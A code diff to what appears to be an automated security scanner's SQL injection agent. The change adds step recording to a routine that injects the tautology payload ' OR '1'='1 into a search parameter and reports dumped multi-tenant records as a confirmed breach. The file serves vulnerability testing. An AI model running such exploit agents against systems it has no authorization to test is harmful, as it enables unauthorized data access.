@@ -5,6 +5,7 @@ Tests for raw SQL concatenation, executes payloads, and verifies database breach
 import httpx
 from urllib.parse import urljoin, quote
 from typing import Dict, Any, Optional, Callable
+from hawkscan.engine.step_recorder import StepRecorder
 
 
 class SqliExploitAgent:
@@ -43,6 +44,11 @@ class SqliExploitAgent:
                         rec_ids = [r.get("id") for r in body if isinstance(r, dict)]
                         if "REC-9001" in rec_ids and "REC-9002" in rec_ids:
                             self.log("SQL INJECTION EXPLOIT CONFIRMED: Bypassed query filters to dump all confidential corporate records!")
+                            recorder = StepRecorder(agent_name="SqliExploitAgent")
+                            recorder.record_step("NAVIGATE", self.target_url, "Opened target application search interface", "SUCCESS")
+                            recorder.record_step("INJECT_SQL_PAYLOAD", exploit_url, f"Injected boolean breakout string '{sqli_payload}' into 'q' parameter", "SUCCESS")
+                            recorder.record_step("DUMP_MULTI_TENANT_RECORDS", exploit_url, f"Bypassed tenant isolation filter; dumped {len(body)} database records: {', '.join(rec_ids)}", "BREACH_CONFIRMED")
+
                             return {
                                 "vulnerability_id": "HAWKSCAN-SQLI-001",
                                 "title": "SQL Injection in Query Search Parameter (SQLi)",
@@ -52,6 +58,7 @@ class SqliExploitAgent:
                                 "target_endpoint": "/api/search",
                                 "http_method": "GET",
                                 "status": "VERIFIED_EXPLOIT",
+                                "recorded_steps": recorder.get_steps(),
                                 "description": (
                                     "The 'q' query parameter in /api/search is concatenated directly into a raw SQL query. "
                                     "Submitting an SQL breakout payload (' OR '1'='1) forces an unconditionally true condition, "
